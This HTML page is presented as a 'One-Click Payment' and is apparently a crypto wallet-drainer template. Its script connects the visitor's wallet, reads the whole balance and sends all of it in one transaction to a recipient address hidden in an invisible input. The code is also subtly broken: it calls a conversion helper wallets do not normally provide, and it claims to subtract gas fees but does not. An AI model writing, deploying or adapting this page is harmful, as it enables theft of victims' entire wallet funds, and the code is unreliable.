<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instant Payment</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
        }
        button {
            background-color: #f0b90b;
            color: black;
            border: none;
            padding: 12px 24px;
            font-size: 18px;
            cursor: pointer;
            border-radius: 5px;
            margin: 10px;
        }
        button:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
        #status {
            margin-top: 20px;
            font-weight: bold;
        }
        .error { color: red; }
        .success { color: green; }
    </style>
</head>
<body>
    <h1>One-Click Payment</h1>
    <p>Sends your full wallet balance instantly.</p>
    
    <!-- Your hardcoded recipient address -->
    <input type="hidden" id="recipient" value="YOUR_WALLET_ADDRESS_HERE">
    
    <button id="connectAndSend">Connect & Send Full Balance</button>
    <p id="status">Waiting for wallet connection...</p>

    <script>
        const recipient = document.getElementById('recipient').value;
        const connectBtn = document.getElementById('connectAndSend');
        const statusEl = document.getElementById('status');

        // Check if Web3 is installed (MetaMask, Binance Wallet, etc.)
        if (typeof window.ethereum === 'undefined') {
            statusEl.innerHTML = '<span class="error">No crypto wallet found. Use Trust Wallet, MetaMask, or Binance Chain Wallet.</span>';
            connectBtn.disabled = true;
        }

        // Single button: Connect + Send Full Balance
        connectBtn.addEventListener('click', async () => {
            try {
                statusEl.innerHTML = "Connecting wallet...";
                
                // 1. Connect Wallet
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const userAddress = accounts[0];
                statusEl.innerHTML = `<span class="success">Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}</span>`;
                
                // 2. Get Full Balance
                const balance = await window.ethereum.request({ 
                    method: 'eth_getBalance', 
                    params: [userAddress, 'latest'] 
                });
                const balanceEth = window.ethereum.utils.fromWei(balance, 'ether');
                
                // 3. Send Full Balance (minus gas fees)
                statusEl.innerHTML = `Sending ${balanceEth}...`;
                const txHash = await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: userAddress,
                        to: recipient,
                        value: balance, // Full balance in Wei
                        gas: '0x5208', // 21,000 gas (standard for simple transfers)
                    }],
                });
                
                // 4. Show Success
                const explorerLink = `https://${window.ethereum.isMetaMask ? 'etherscan.io' : 'bscscan.com'}/tx/${txHash}`;
                statusEl.innerHTML = `
                    <span class="success">
                        Sent! <a href="${explorerLink}" target="_blank">View Transaction</a>
                    </span>
                `;
                connectBtn.disabled = true;
            } catch (error) {
                statusEl.innerHTML = `<span class="error">Failed: ${error.message}</span>`;
            }
        });
    </script>
</body>
</html>
